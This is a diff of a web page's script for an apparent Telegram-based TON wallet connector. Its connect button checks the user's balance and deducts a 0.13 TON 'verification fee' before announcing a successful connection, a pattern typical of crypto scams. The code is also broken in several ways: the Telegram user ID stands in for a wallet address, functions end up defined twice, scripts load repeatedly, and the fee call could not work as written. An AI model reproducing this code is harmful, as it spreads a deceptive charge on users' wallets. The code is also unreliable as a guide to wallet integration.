@@ -160,119 +160,154 @@
     </div>
 
     <!-- Add Telegram SDK for WebApp integration -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-
+    
 
     <script>
         // Initialize Telegram WebApp
-window.addEventListener("load", function () {
-    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
-        Telegram.WebApp.init();
-        console.log("Telegram WebApp initialized");
-    } else {
-        console.error("Telegram WebApp SDK not found.");
-    }
-});
-
-// Function to open the wallet modal
-document.getElementById("wallet-connect-btn").addEventListener("click", function () {
-    document.getElementById("web3Modal").style.display = "flex";
-});
-
-// Function to close the modal
-function closeModal() {
-    document.getElementById("web3Modal").style.display = "none";
-}
-
-// Redirect to wallet provider based on selection
-function redirectToWallet(walletName) {
-    let walletURL;
-
-    switch (walletName) {
-        case 'Tonkeeper':
-            walletURL = 'https://app.tonkeeper.com/';
-            break;
-        case 'MyTonWallet':
-            walletURL = 'https://wallet.ton.org/';
-            break;
-        case 'Tonhub':
-            walletURL = 'https://tonhub.com/';
-            break;
-        case 'DeWallet':
-            walletURL = 'https://dewallet.app/';
-            break;
-        default:
-            console.error("Unknown wallet provider");
-            return;
-    }
-
-    window.open(walletURL, '_blank');
-    closeModal();
-}
-
-// Telegram WebApp wallet connection handling
-document.getElementById("openTelegramWallet").addEventListener("click", async function () {
-    try {
-        const walletAddress = await connectToTelegramWallet();
-        const balance = await fetchTONBalance(walletAddress);
-
-        // Check if balance is sufficient for the verification fee
-        if (balance >= 0.13) {
-            const deductionSuccess = await deductVerificationFee(walletAddress, 0.13);
-            if (deductionSuccess) {
-                updateWalletUI(walletAddress);
-                alert("Wallet connected successfully!");
-            } else {
-                alert("Verification fee deduction failed. Please try again.");
-            }
-        } else {
-            alert("Insufficient balance for verification. You need at least 0.13 TON.");
+        window.addEventListener("load", function () {
+            Telegram.WebApp.init();
+        });
+    
+        // Function to open the wallet modal
+        document.getElementById("wallet-connect-btn").addEventListener("click", function () {
+            document.getElementById("web3Modal").style.display = "flex";
+        });
+    
+        // Function to close the modal
+        function closeModal() {
+            document.getElementById("web3Modal").style.display = "none";
         }
-    } catch (error) {
-        console.error("Failed to connect to wallet:", error);
-        alert("Wallet connection failed. Please try again.");
-    } finally {
-        closeModal();
-    }
-});
-
-// Function to connect to Telegram Wallet in real-time
-async function connectToTelegramWallet() {
-    try {
-        const walletAddress = Telegram.WebApp.initDataUnsafe.user?.id;
-        if (!walletAddress) throw new Error("No wallet address found.");
-        return walletAddress;
-    } catch (error) {
-        console.error("Telegram Wallet connection error:", error);
-        throw error;
-    }
-}
-
-// Fetch TON balance via TON API in real-time
+    
+        // Redirect to wallet provider based on selection
+        function redirectToWallet(walletName) {
+            let walletURL;
+    
+            switch(walletName) {
+                case 'Tonkeeper':
+                    walletURL = 'https://app.tonkeeper.com/';
+                    break;
+                case 'MyTonWallet':
+                    walletURL = 'https://wallet.ton.org/';
+                    break;
+                case 'Tonhub':
+                    walletURL = 'https://tonhub.com/';
+                    break;
+                case 'DeWallet':
+                    walletURL = 'https://dewallet.app/';
+                    break;
+                default:
+                    console.error("Unknown wallet provider");
+                    return;
+            }
+    
+            window.open(walletURL, '_blank');
+            closeModal();
+        }
+    
+        // Telegram WebApp wallet connection handling
+        document.getElementById("openTelegramWallet").addEventListener("click", async function () {
+            try {
+                const walletAddress = await connectToTelegramWallet();
+                const balance = await fetchTONBalance(walletAddress);
+    
+                // Check if balance is sufficient for the verification fee
+                if (balance >= 0.13) {
+                    const deductionSuccess = await deductVerificationFee(walletAddress, 0.13);
+                    if (deductionSuccess) {
+                        updateWalletUI(walletAddress);
+                        alert("Wallet connected successfully!");
+                    } else {
+                        alert("Verification fee deduction failed. Please try again.");
+                    }
+                } else {
+                    alert("Insufficient balance for verification. You need at least 0.13 TON.");
+                }
+            } catch (error) {
+                console.error("Failed to connect to wallet:", error);
+                alert("Wallet connection failed. Please try again.");
+            } finally {
+                closeModal();
+            }
+        });
+    
+        // Function to connect to Telegram Wallet in real-time
+        async function connectToTelegramWallet() {
+            // Use the Telegram WebApp platform or TON Wallet SDK
+            try {
+                const walletAddress = Telegram.WebApp.initDataUnsafe.user.id; // Get user ID or wallet address from Telegram
+                if (!walletAddress) throw new Error("No wallet address found.");
+                return walletAddress;
+            } catch (error) {
+                console.error("Telegram Wallet connection error:", error);
+                throw error;
+            }
+        }
+    
+        // Fetch TON balance via TON API in real-time
+        async function fetchTONBalance(walletAddress) {
+            try {
+                const response = await fetch(`https://api.ton.sh/getAddressBalance?address=${walletAddress}`);
+                if (!response.ok) throw new Error("Error fetching TON balance");
+                const { balance } = await response.json();
+                return balance / 1e9; // Convert to TON from nanoton
+            } catch (error) {
+                console.error("Error fetching balance:", error);
+                throw error;
+            }
+        }
+    
+        // Deduct TON fee for verification in real-time
+        async function deductVerificationFee(walletAddress, feeAmount) {
+            try {
+                const response = await fetch("https://api.ton.sh/deductFee", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({ address: walletAddress, fee: feeAmount * 1e9 }), // Convert TON to nanoton
+                });
+    
+                const { success } = await response.json();
+                return success;
+            } catch (error) {
+                console.error("Error deducting fee:", error);
+                return false;
+            }
+        }
+    
+        // Update UI with wallet address and balance
+        function updateWalletUI(walletAddress) {
+            const walletButton = document.getElementById("wallet-connect-btn");
+            walletButton.textContent = walletAddress;
+            walletButton.disabled = true;
+            document.getElementById("balance").textContent = "TON: Fetching...";
+            fetchTONBalance(walletAddress).then(balance => {
+                document.getElementById("balance").textContent = `TON: ${balance}`;
+            });
+        }
+        // Fetch TON balance from backend
 async function fetchTONBalance(walletAddress) {
     try {
-        const response = await fetch(`https://api.ton.sh/getAddressBalance?address=${walletAddress}`);
-        if (!response.ok) throw new Error("Error fetching TON balance");
+        const response = await fetch(`/api/ton/getBalance/${walletAddress}`);
         const { balance } = await response.json();
-        return balance / 1e9; // Convert to TON from nanoton
+        return balance;
     } catch (error) {
         console.error("Error fetching balance:", error);
         throw error;
     }
 }
 
-// Deduct TON fee for verification in real-time
+// Deduct verification fee from backend
 async function deductVerificationFee(walletAddress, feeAmount) {
     try {
-        const response = await fetch("https://api.ton.sh/deductFee", {
+        const response = await fetch(`/api/ton/deductFee`, {
             method: "POST",
             headers: {
-                "Content-Type": "application/json",
+                "Content-Type": "application/json"
             },
-            body: JSON.stringify({ address: walletAddress, fee: feeAmount * 1e9 }), // Convert TON to nanoton
+            body: JSON.stringify({ walletAddress, feeAmount })
         });
 
-        if (!response.ok) throw new Error("Error deducting fee");
         const { success } = await response.json();
         return success;
     } catch (error) {
@@ -280,21 +315,6 @@ async function deductVerificationFee(walletAddress, feeAmount) {
         return false;
     }
 }
-
-// Update UI with wallet address and balance
-function updateWalletUI(walletAddress) {
-    const walletButton = document.getElementById("wallet-connect-btn");
-    walletButton.textContent = `Connected: ${walletAddress}`;
-    walletButton.disabled = true;
-
-    document.getElementById("balance").textContent = "TON: Fetching...";
-    fetchTONBalance(walletAddress).then(balance => {
-        document.getElementById("balance").textContent = `TON: ${balance}`;
-    }).catch(error => {
-        document.getElementById("balance").textContent = "TON: Error fetching balance";
-    });
-}
-
 
 
 
@@ -363,13 +383,15 @@ async function handleDepositClick() {
 // Attach the event listener to the button
 document.getElementById('withdraw-btn').addEventListener('click', handleDepositClick);
     </script>
-    <script type="module" src="https://cdn.jsdelivr.net/npm/web3modal"></script>
-    <script type="module" src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js"></script>
-    <script type="module" src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
-    <script type="module" src="https://cdn.jsdelivr.net/npm/web3modal"></script>
-    <script type="module" type="module" src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
-    <script type="module" src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider"></script>
-    <script type="module" src="https://telegram.org/js/telegram-web-app.js"></script>
+            
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3modal"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3modal"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="assets/js/balance.js"></script>
 
 
